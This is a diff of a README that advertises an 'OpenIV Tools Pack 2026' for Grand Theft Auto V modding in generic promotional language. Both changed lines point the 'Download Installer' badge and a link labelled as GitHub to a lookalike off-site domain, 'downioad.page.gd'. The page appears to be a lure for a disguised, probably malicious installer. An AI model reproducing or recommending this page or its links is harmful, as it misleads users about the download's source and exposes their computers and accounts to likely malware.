@@ -2,7 +2,7 @@
 
 OpenIV Tools Pack 2026 is a comprehensive and reliable modification toolkit designed specifically for Grand Theft Auto V enthusiasts. It offers an intuitive interface and robust features to help you easily install and manage various modifications, enhancing your gaming experience on Windows platforms. With continuous updates and community support, this suite remains the top choice for modders in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -62,6 +62,6 @@ A: OpenIV Tools Pack is designed for personal use and complies with applicable l
 
 To get started with OpenIV Tools Pack 2026, download the latest version from our official GitHub page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This link will take you directly to the download page where you can find the installer and additional resources.
